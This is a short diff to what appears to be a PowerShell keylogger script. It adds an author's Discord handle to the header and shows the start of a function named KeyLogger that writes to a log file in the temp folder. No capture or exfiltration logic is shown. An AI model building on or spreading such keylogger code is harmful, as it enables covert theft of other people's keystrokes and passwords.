@@ -1,4 +1,5 @@
 #MADE BY SYKE
+#Discord: syke#116
 
 # keylogger
 function KeyLogger($logFile="$env:temp/keylogger.log") {
